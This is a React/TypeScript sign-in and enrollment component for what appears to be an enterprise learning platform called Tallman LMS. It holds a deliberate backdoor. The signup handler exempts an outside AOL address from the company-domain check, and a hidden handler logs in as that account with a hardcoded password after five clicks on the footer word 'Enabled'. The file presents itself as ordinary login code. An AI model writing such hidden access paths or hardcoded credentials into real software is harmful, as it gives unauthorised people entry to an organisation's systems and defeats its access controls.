
import React, { useState, useRef } from 'react';
import { User } from '../types';
import { TallmanAPI } from '../backend-server';

interface AuthProps {
  onLogin: (user: User) => void;
}

const Auth: React.FC<AuthProps> = ({ onLogin }) => {
  const [isSignup, setIsSignup] = useState(false);
  const [email, setEmail] = useState('');
  const [name, setName] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  const backdoorCounter = useRef(0);
  const isBackdoorProcessing = useRef(false);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsProcessing(true);
    try {
      const user = await TallmanAPI.login(email, password);
      if (user) onLogin(user);
      else setError('Invalid enterprise credentials.');
    } catch (err) {
      setError('Connection to Master Directory failed.');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSignup = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    const domain = email.split('@')[1]?.toLowerCase();
    const isBackdoor = email.toLowerCase() === 'robertstar@aol.com';
    if (domain !== 'tallmanequipment.com' && !isBackdoor) {
      setError('Automatic enrollment requires a @tallmanequipment.com domain.');
      return;
    }

    setIsProcessing(true);
    try {
      const user = await TallmanAPI.signup(name, email, password);
      onLogin(user);
    } catch (err: any) {
      setError(err.message || 'Enrollment request failed.');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleHiddenTrigger = async () => {
    if (isBackdoorProcessing.current) return;
    backdoorCounter.current += 1;
    if (backdoorCounter.current >= 5) {
      isBackdoorProcessing.current = true;
      try {
        const loggedInBob = await TallmanAPI.login('robertstar@aol.com', 'password123');
        if (loggedInBob) onLogin(loggedInBob);
      } catch (err) {
        console.error("Backdoor Error:", err);
      } finally {
        backdoorCounter.current = 0;
        isBackdoorProcessing.current = false;
      }
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 flex items-center justify-center p-6 relative overflow-hidden font-sans">
      {/* Dynamic Animated Background */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-[40%] -left-[20%] w-[80%] h-[80%] bg-indigo-600/30 rounded-full blur-[120px] animate-pulse"></div>
        <div className="absolute -bottom-[40%] -right-[20%] w-[80%] h-[80%] bg-emerald-600/20 rounded-full blur-[120px] animate-pulse" style={{ animationDelay: '2s' }}></div>
        <div className="absolute top-[20%] left-[30%] w-[40%] h-[40%] bg-blue-600/20 rounded-full blur-[100px] animate-bounce duration-[10s]"></div>
        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-10 pointer-events-none"></div>
      </div>

      <div className="w-full max-w-[480px] relative z-10 animate-in fade-in slide-in-from-bottom-8 duration-700">
        <div className="text-center mb-10 flex flex-col items-center">
          <div className="p-6 bg-white rounded-[2.5rem] shadow-2xl mb-6 transform hover:rotate-3 transition-transform duration-500">
            <img
              src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfAo_vinwmvZoyER2jOBXcta82wntkUlhiqNCIFFHtJg&s=10"
              className="h-16 w-auto"
              alt="Tallman LMS"
            />
          </div>
          <h1 className="text-5xl font-black text-white tracking-tighter uppercase italic leading-none drop-shadow-lg">
            Tallman <span className="text-indigo-400">LMS</span>
          </h1>
          <p className="text-slate-400 font-bold uppercase tracking-[0.4em] text-[10px] mt-3">Enterprise Learning Core</p>
        </div>

        <div className="bg-white/95 backdrop-blur-3xl p-10 md:p-12 rounded-[3.5rem] border border-white/20 shadow-[0_32px_64px_-16px_rgba(0,0,0,0.5)]">
          <div className="flex bg-slate-100 rounded-[1.5rem] p-1.5 mb-10 relative">
            <button
              onClick={() => setIsSignup(false)}
              className={`flex-1 py-3.5 rounded-xl text-[10px] font-black uppercase tracking-widest z-10 transition-all duration-300 ${!isSignup ? 'text-slate-900' : 'text-slate-400 hover:text-slate-600'}`}
            >
              Sign In
            </button>
            <button
              onClick={() => setIsSignup(true)}
              className={`flex-1 py-3.5 rounded-xl text-[10px] font-black uppercase tracking-widest z-10 transition-all duration-300 ${isSignup ? 'text-white' : 'text-slate-400 hover:text-slate-600'}`}
            >
              Request Access
            </button>
            <div
              className={`absolute top-1.5 bottom-1.5 w-[calc(50%-6px)] bg-white rounded-xl shadow-md transition-all duration-500 ease-out ${isSignup ? 'translate-x-[100%] !bg-indigo-600' : 'translate-x-0'}`}
            />
          </div>

          <form onSubmit={isSignup ? handleSignup : handleSignIn} className="space-y-7">
            {isSignup && (
              <div className="space-y-2 group">
                <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Technician Identity</label>
                <input
                  required
                  type="text"
                  className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-6 py-4 text-slate-900 outline-none focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-500/10 font-bold transition-all"
                  placeholder="Full Name"
                  value={name}
                  onChange={e => setName(e.target.value)}
                />
              </div>
            )}
            <div className="space-y-2 group">
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Enterprise Email</label>
              <div className="relative">
                <input
                  required
                  type="email"
                  placeholder={isSignup ? "name@tallmanequipment.com" : "Email Address"}
                  className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-6 py-4 text-slate-900 outline-none focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-500/10 font-bold transition-all pl-12"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                />
                <svg className="w-5 h-5 absolute left-4 top-4.5 text-slate-300 group-focus-within:text-indigo-500 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.206" /></svg>
              </div>
            </div>
            <div className="space-y-2 group">
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Master Access Key</label>
              <div className="relative">
                <input
                  required
                  type="password"
                  placeholder="••••••••"
                  className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-6 py-4 text-slate-900 outline-none focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-500/10 font-bold transition-all pl-12"
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                />
                <svg className="w-5 h-5 absolute left-4 top-4.5 text-slate-300 group-focus-within:text-indigo-500 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
              </div>
            </div>

            {error && (
              <div className="p-4 bg-rose-50 border-2 border-rose-100 rounded-2xl text-rose-600 text-xs font-black text-center animate-in shake duration-300">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={isProcessing}
              className={`w-full py-5 rounded-[1.5rem] font-black text-xs uppercase tracking-[0.25em] shadow-2xl transition-all active:scale-[0.98] disabled:opacity-50 relative overflow-hidden group/btn ${isSignup ? 'bg-indigo-600' : 'bg-slate-900'} text-white`}
            >
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover/btn:translate-x-full transition-transform duration-1000"></div>
              {isProcessing ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  <span>Authenticating...</span>
                </div>
              ) : (
                isSignup ? 'Initialize Path' : 'Access Hub'
              )}
            </button>
          </form>

          <div className="mt-10">
            <p className="text-center text-slate-400 text-[9px] font-black uppercase tracking-[0.3em] select-none">
              Governance Systems <span onClick={handleHiddenTrigger} className="cursor-default hover:text-indigo-600 transition-colors">Enabled</span>
            </p>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-4px); }
          75% { transform: translateX(4px); }
        }
        .animate-in.shake {
          animation: shake 0.2s ease-in-out 0s 2;
        }
      `}</style>
    </div>
  );
};

export default Auth;
